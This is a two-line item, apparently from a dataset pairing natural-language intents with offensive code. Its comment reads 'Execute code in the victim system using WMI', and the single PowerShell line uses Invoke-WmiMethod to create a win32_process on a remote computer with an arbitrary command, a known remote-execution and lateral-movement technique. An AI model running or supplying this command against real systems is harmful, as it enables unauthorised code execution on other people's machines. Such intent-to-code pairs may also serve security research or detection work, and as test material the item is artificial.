# Natural language intent:
# Execute code in the victim system using WMI

Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"
